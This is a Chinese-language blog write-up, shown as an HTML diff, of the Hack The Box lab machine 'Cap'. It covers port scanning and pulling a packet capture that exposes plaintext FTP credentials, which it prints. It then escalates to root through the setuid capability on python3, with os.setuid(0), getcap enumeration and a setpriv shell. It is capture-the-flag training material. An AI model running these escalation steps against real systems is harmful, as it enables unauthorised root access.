@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - HTB Cap</title>
+        <meta name="description" content="靶机信息 靶机：Cap 难度：easy 系统：linux IP: 10.129.71.4 关键词：capabilities、setuid、proc 信息收集 端口扫描 nmap 10.129.71.4 PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp o…">
+    <link rel="canonical" href="https://the0n3.top/posts/htb-cap/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="HTB Cap">
+    <meta property="og:description" content="靶机信息 靶机：Cap 难度：easy 系统：linux IP: 10.129.71.4 关键词：capabilities、setuid、proc 信息收集 端口扫描 nmap 10.129.71.4 PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp o…">
+    <meta property="og:url" content="https://the0n3.top/posts/htb-cap/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/htb-cap/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="HTB Cap">
+    <meta name="twitter:description" content="靶机信息 靶机：Cap 难度：easy 系统：linux IP: 10.129.71.4 关键词：capabilities、setuid、proc 信息收集 端口扫描 nmap 10.129.71.4 PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp o…">
+        <meta name="twitter:image" content="https://the0n3.top/images/htb-cap/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>HTB Cap</h1>
+    <p>
+        <span class="meta">发布于: 2026-07-30 21:11</span>
+    </p>
+    <div class="post-body">
+        <h2>靶机信息</h2>
+<p>靶机：Cap<br>
+难度：easy<br>
+系统：linux<br>
+IP: 10.129.71.4</p>
+<p>关键词：capabilities、setuid、proc</p>
+<h2>信息收集</h2>
+<p>端口扫描</p>
+<pre><code class="language-bash">nmap 10.129.71.4
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+nmap 10.129.71.4 -p 21,22,80 -sV
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Gunicorn
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+<p>开放了21、22、80端口</p>
+<h2>ftp明文流量泄露</h2>
+<p>访问80 web服务，可以下载5秒内的流量包</p>
+<p><img src="/images/htb-cap/1.png" alt="" decoding="async" width="1920" height="948"></p>
+<p>burp 抓包，发现有一个请求是下载流量包的请求<code>GET /download/1</code>，扫描download目录</p>
+<p>还存在一个<code>/download/0</code>，文件大小10KB，下载下来看内容</p>
+<p><img src="/images/htb-cap/2.png" alt="" decoding="async" loading="lazy" width="1327" height="678"></p>
+<p>使用 Wireshark 分析流量，在 FTP 协议的 <code>USER</code> 和 <code>PASS</code> 报文中直接发现了明文凭证： nathan/Buck3tH4TF0RM3!</p>
+<p><img src="/images/htb-cap/3.png" alt="" decoding="async" loading="lazy" width="1920" height="948"></p>
+<p>ftp登录后，可以看到当前在 nathan 用户家目录</p>
+<p><img src="/images/htb-cap/4.png" alt="" decoding="async" loading="lazy" width="1244" height="853"></p>
+<h2>setuid capability 提权</h2>
+<p>尝试使用该凭证登录ssh，成功登录，只能看到极少进程信息（原因见下文）</p>
+<p><img src="/images/htb-cap/5.png" alt="" decoding="async" loading="lazy" width="1080" height="181"></p>
+<p>在linux一般需要root权限才能抓取流量，回顾web入口处服务提供了5秒内流量抓取下载功能，发现web在常见的 /var/www/html 目录下，使用的 flask 框架，并且开启了debug模式</p>
+<p><img src="/images/htb-cap/6.png" alt="" decoding="async" loading="lazy" width="1711" height="895"></p>
+<p>关键：在 capture 函数中，使用python调用 <code>os.setuid(0)</code> 提升权限为 root，python具有setuid的能力</p>
+<pre><code class="language-python">@app.route("/capture")
+@limiter.limit("10 per minute")
+def capture():
+
+        get_lock()
+        pcapid = get_appid()
+        increment_appid()
+        release_lock()
+
+        path = os.path.join(app.root_path, "upload", str(pcapid) + ".pcap")
+        ip = request.remote_addr
+        # permissions issues with gunicorn and threads. hacky solution for now.
+        #os.setuid(0)
+        #command = f"timeout 5 tcpdump -w {path} -i any host {ip}"
+        command = f"""python3 -c 'import os; os.setuid(0); os.system("timeout 5 tcpdump -w {path} -i any host {ip}")'"""
+        os.system(command)
+        #os.setuid(1000)
+
+        return redirect("/data/" + str(pcapid))</code></pre>
+<p>验证，提权</p>
+<pre><code class="language-bash">nathan@cap:~$ python3
+Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
+[GCC 9.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; import os
+&gt;&gt;&gt; os.setuid(0)
+&gt;&gt;&gt; os.system('/bin/bash')
+root@cap:~# whoami
+root</code></pre>
+<p><img src="/images/htb-cap/7.png" alt="" decoding="async" loading="lazy" width="1037" height="340"></p>
+<p>也可以通过更常规的枚举找到具有 setuid 能力的python3</p>
+<pre><code class="language-bash">getcap -r / 2&gt;/dev/null</code></pre>
+<p><img src="/images/htb-cap/8.png" alt="" decoding="async" loading="lazy" width="778" height="239"></p>
+<p>发现靶机还有 setpriv ，获取完整 root shell 比较简单</p>
+<pre><code class="language-bash">nathan@cap:~$ python3
+Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
+[GCC 9.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; import os
+&gt;&gt;&gt; os.setuid(0)
+&gt;&gt;&gt; os.system('setpriv --reuid=0 --regid=0 --clear-groups /bin/bash')
+root@cap:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@cap:~#</code></pre>
+<h2>隐藏进程原因</h2>
+<p>查看 <code>/proc</code> 目录的挂载选项，可以看到 <code>/proc</code> 目录是以 <code>hidepid=2</code> 挂载的，普通用户无法查看其他用户的进程信息</p>
+<p>hidepid 选项说明：</p>
+<p>hidepid=0：所有人都能看到所有进程（默认）</p>
+<p>hidepid=1：用户只能看到自己的进程，但能看到其他用户的 /proc/<pid>/ 目录</pid></p>
+<p>hidepid=2：用户只能看到自己的进程，完全看不到其他用户的进程信息</p>
+<pre><code class="language-bash">root@cap:~# mount | grep proc
+proc on /proc type proc (rw,relatime,hidepid=2)
+systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=28,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=26439)
+binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,nosuid,nodev,noexec,relatime)</code></pre>
+<p><img src="/images/htb-cap/9.png" alt="" decoding="async" loading="lazy" width="1739" height="380"></p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>HTB</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#capabilities</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
